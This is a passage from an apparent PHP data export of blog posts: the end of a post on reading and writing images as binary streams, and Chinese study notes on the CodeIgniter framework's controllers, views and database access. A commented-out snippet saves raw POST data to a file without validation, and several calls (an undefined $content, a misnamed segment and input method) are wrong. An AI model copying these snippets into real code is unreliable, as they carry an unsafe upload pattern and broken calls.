//先将图片转换为字节流，然后再转回来输出
$filename&nbsp;=&nbsp;&quot;abc.jpg&quot;;
$PSize&nbsp;=&nbsp;filesize($filename);
$picturedata&nbsp;=&nbsp;fread(fopen($filename,&quot;r&quot;),$PSize);
//header(&nbsp;&quot;Content-type:&nbsp;image/jpeg&quot;);
echo&nbsp;$picturedata;
$newFilePath&nbsp;=&nbsp;&quot;bb.jpg&quot;;
$newFile&nbsp;=&nbsp;fopen($newFilePath,&quot;w&quot;);&nbsp;&nbsp;&nbsp;&nbsp;//打开文件准备写入
$fs&nbsp;=&nbsp;fwrite($newFile,$picturedata);//写入二进制流到文件
fclose($newFile);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//关闭文件
?&gt;
&lt;img&nbsp;src=&quot;bb.jpg&quot;&nbsp;/&gt;

&lt;?php
/*&nbsp;//由于上传过来的图片被保存在一个临时文件中，所以
//我们仅需要读取该文件就可以获取传过来的图片
$fp&nbsp;=&nbsp;fopen($_FILES[&quot;myFile&quot;][&quot;tmp_name&quot;],”rb”);
$buf&nbsp;=&nbsp;addslashes(fread($fp,$_FILES[&quot;myFile&quot;][&quot;size&quot;]));
$buf&nbsp;=&nbsp;fread($fp,$_FILES[&quot;myFile&quot;][&quot;size&quot;]);

//二进制转换成图片
//注：$newFilePath&nbsp;对生成的图片名和路径做处理，这里自己去实现。
$newFilePath=&#39;1.jpg&#39;;
$data&nbsp;=&nbsp;$GLOBALS[HTTP_RAW_POST_DATA];&nbsp;&nbsp;&nbsp;&nbsp;//得到post过来的二进制原始数据
if(empty($data)){&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$data=file_get_contents(&quot;php://input&quot;);
}
$newFile&nbsp;=&nbsp;fopen($newFilePath,&quot;w&quot;);&nbsp;&nbsp;&nbsp;&nbsp;//打开文件准备写入
fwrite($newFile,$data);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//写入二进制流到文件
fclose($newFile);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//关闭文件

//可以把读取到的二进制流存到数据库，也可以直接写入成一个图片。
//获取二进制头文件，从而得知属于什么类型文件
$bin&nbsp;=&nbsp;substr($content,0,2);
$strInfo&nbsp;=&nbsp;@unpack(&quot;C2chars&quot;,&nbsp;$bin);
$typeCode&nbsp;=&nbsp;intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);
$fileType&nbsp;=&nbsp;&#39;&#39;;
switch&nbsp;($typeCode)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;7790:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$fileType&nbsp;=&nbsp;&#39;exe&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;7784:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$fileType&nbsp;=&nbsp;&#39;midi&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;8297:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$fileType&nbsp;=&nbsp;&#39;rar&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;255216:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$fileType&nbsp;=&nbsp;&#39;jpg&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;7173:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$fileType&nbsp;=&nbsp;&#39;gif&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;6677:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$fileType&nbsp;=&nbsp;&#39;bmp&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;13780:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$fileType&nbsp;=&nbsp;&#39;png&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;default:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&#39;unknown&#39;;
}&nbsp;
*/</pre><p><br/></p>',
            'keyword' => 'PHP,图片,二进制,数据流',
            'sortid' => '6',
            'img' => '',
            'views' => '2',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 16:25:39',
          ),
          43 => 
          array (
            'id' => '42',
            'uid' => '1',
            'title' => 'CI框架学习笔记',
            'content' => '<pre class=\\"brush:php;toolbar:false\\">主要内容
&nbsp;&nbsp;&nbsp;&nbsp;CI简介
&nbsp;&nbsp;&nbsp;&nbsp;CI的超级对象
&nbsp;&nbsp;&nbsp;&nbsp;CI的控制器与视图
&nbsp;&nbsp;&nbsp;&nbsp;数据库访问
&nbsp;&nbsp;&nbsp;&nbsp;AR模型
&nbsp;&nbsp;&nbsp;&nbsp;如何扩展CI的控制器
&nbsp;&nbsp;&nbsp;&nbsp;CI中的模型
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;url相关函数
&nbsp;&nbsp;&nbsp;&nbsp;设置路由
&nbsp;&nbsp;&nbsp;&nbsp;分页
&nbsp;&nbsp;&nbsp;&nbsp;文件上传
&nbsp;&nbsp;&nbsp;&nbsp;session
&nbsp;&nbsp;&nbsp;&nbsp;验证码
&nbsp;&nbsp;&nbsp;&nbsp;表单验证

入口文件.php/控制器/动作

controlles&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;控制器
models&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模型
views&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;试图

默认控制器是welcome
默认动作是index
不做任何指定&nbsp;默认访问的

CI中的控制器：
&nbsp;&nbsp;&nbsp;&nbsp;1.不需要加后缀&nbsp;例如：userAction，直接是类名.php
&nbsp;&nbsp;&nbsp;&nbsp;2.文件名全部小写
&nbsp;&nbsp;&nbsp;&nbsp;3.所有的控制器需要直接或间接继承自CI_Controller类
&nbsp;&nbsp;&nbsp;&nbsp;4.protected&nbsp;受保护的&nbsp;方法不能被浏览器直接请求
&nbsp;&nbsp;&nbsp;&nbsp;5.以下划线开头的方法，不能被浏览器直接请求_test
&nbsp;&nbsp;&nbsp;&nbsp;6.&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;test2(){&nbsp;&nbsp;&nbsp;&nbsp;//在类内部可以
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_test1();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;7.控制器中对动作(方法)要求：public
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以_开头
&nbsp;&nbsp;&nbsp;&nbsp;8.方法名不区分大小写
&nbsp;&nbsp;&nbsp;&nbsp;9.与类名相同的，会被PHP当做构造方法，__construct()

CI中的视图：
&nbsp;&nbsp;&nbsp;&nbsp;1.在控制器中加载特定文件夹的视图&nbsp;user/index
&nbsp;&nbsp;&nbsp;&nbsp;2.视图中直接使用原声php代码，不适用模板引擎
&nbsp;&nbsp;&nbsp;&nbsp;3.如何将变量分配到视图中，在视图里使用
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.$this-&gt;assign(&#39;key&#39;,&#39;value&#39;);&nbsp;smarty
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.$this-&gt;load-&gt;vars(&#39;title&#39;,&#39;this&nbsp;is&nbsp;title&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.在视图输出&nbsp;：echo&nbsp;$title;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.分配二维数组
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$list&nbsp;=&nbsp;array(array(),array(),array());
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;list&#39;]&nbsp;=&nbsp;$list;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;title&#39;]&nbsp;=&nbsp;&#39;这是标题&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;vars($data);&nbsp;//可以多次使用
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//模板
&nbsp;&nbsp;&nbsp;&nbsp;4.推荐使用&lt;?php&nbsp;foreach($list&nbsp;as&nbsp;$item):?&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;?=$item[&#39;name&#39;]?&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;?php&nbsp;endforeach;?&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
CI中的超级对象：
&nbsp;&nbsp;&nbsp;&nbsp;var_dump($this);&nbsp;//控制器对象，超级对象
&nbsp;&nbsp;&nbsp;&nbsp;var_dump($this-&gt;load);
&nbsp;&nbsp;&nbsp;&nbsp;当前的控制器对象
&nbsp;&nbsp;&nbsp;&nbsp;提供了很多属性
&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;装载器类的实例&nbsp;system/core/Loader.php
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;装载器类提供的方法：
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;view()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;装载视图
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vars()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;分配变量到视图
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;database()&nbsp;&nbsp;&nbsp;&nbsp;装载数据库操作对象
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;model()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;装载模型对象
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;helper()&nbsp;&nbsp;&nbsp;&nbsp;加载一些辅助函数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//CI会自动实例化一个CI_Loader的对象，放在超级对象的属性中
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//下面代码帮助大家理解$this-&gt;load属性
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$obj&nbsp;=&nbsp;new&nbsp;CI_Loader();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load=$obj;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;view();
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;uri
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是CI_URI的实例(url的一些东西)system/core/URI.php
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CI_URI类提供方法：
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*segment(n)&nbsp;&nbsp;用于获取url中的第n个参数(值)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;入口文件.php/控制器/动作/参数1/参数2
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;uri-&gt;segment(4);&nbsp;//获取第四段的
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;传统的：使用&nbsp;参数1/值1/参数2/值2&nbsp;&nbsp;//$_GET[&#39;id&#39;];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以在方法里面直接写，直接输出
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//index.php/控制器/index/6
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$this-&gt;segment(2);&nbsp;&nbsp;&nbsp;&nbsp;//输出6
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;index($p)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$p;&nbsp;//输出6
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;input
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是CI_Input的实例(url的一些东西)system/core/Input.php
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;提供的方法
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;input_post(&#39;username&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;input_server(&#39;DOCUMENT_ROOT&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;等于&nbsp;var_dump($_SERVER[&#39;&#39;]);
&nbsp;&nbsp;&nbsp;&nbsp;在视图中&nbsp;直接用$this来访问超级对象&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;
ci中的数据库操作
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AR模型，就是以前的model
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.打开配置文件database.php
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.将数据库访问对象，装载到超级对象的属性&nbsp;$this-&gt;db&nbsp;中
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;database();&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//配置自动加载db
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//把他写入autoload里面,$autoload[&#39;libraries&#39;]&nbsp;=&nbsp;array(&#39;database&#39;);&nbsp;,就不需要每次加载了
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.执行一些数据库操作函数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查询：
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var_dump($this-&gt;db)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//加载后，会放入超级对象属性中,默认属性名是db
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//执行操作,调用对象的某一个方法
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$this-&gt;db-&gt;query($sql);&nbsp;&nbsp;&nbsp;&nbsp;//返回对象
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$list&nbsp;=&nbsp;$res-&gt;result();&nbsp;&nbsp;&nbsp;&nbsp;//返回数组，里面是一个一个的对象
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var_dump($list);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//mysql_fetch_object();&nbsp;//返回对象
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;user_list&#39;]&nbsp;=&nbsp;$users;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//放到模板中,作为第二个参数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;view(&#39;user/showusers&#39;,$data);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res-&gt;result_array();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//返回二维数组，关联数组
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res-&gt;row();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//返回第一条数据,直接是一个对象
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;添加：
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;databases();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//加载数据库操作类
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sql&nbsp;=&nbsp;&quot;insert&nbsp;into&nbsp;user&nbsp;(name,password)&nbsp;values&nbsp;(&#39;jack&#39;,&#39;123&#39;)&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$this-&gt;db-&gt;query($sql);&nbsp;&nbsp;&nbsp;&nbsp;//结果为：true&nbsp;or&nbsp;false
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($res)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;db-&gt;affected_rows();&nbsp;&nbsp;&nbsp;&nbsp;//获取影响行数mysql_affected_rows()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;db-&gt;insert_id();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//获取insert操作产生的id，自增id
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修改：
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;删除：
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;解决安全：&nbsp;&nbsp;&nbsp;&nbsp;可以表前缀;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;配置一下
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$db[&#39;default&#39;][&#39;dbprefix&#39;]&nbsp;=&nbsp;&#39;blog_&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$db[&#39;default&#39;][&#39;swap_pre&#39;]&nbsp;=&nbsp;&#39;blog_&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;配置为一样，代码中就直接写死就行，如果以后表前缀变化，只需要
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修改$db[&#39;default&#39;][&#39;dbprefix&#39;]&nbsp;=&nbsp;&#39;new_&#39;;&nbsp;代码中的blog_会自动替换为new_
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;参数绑定,?添加&nbsp;查询;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[0]&nbsp;=&nbsp;&quot;ss&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[1]&nbsp;=&nbsp;&quot;123&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sql&nbsp;=&nbsp;&quot;insert&nbsp;into&nbsp;user&nbsp;(name,password)&nbsp;values&nbsp;(?,?)&quot;;//安全
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$this-&gt;db-&gt;query($sql,$data);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
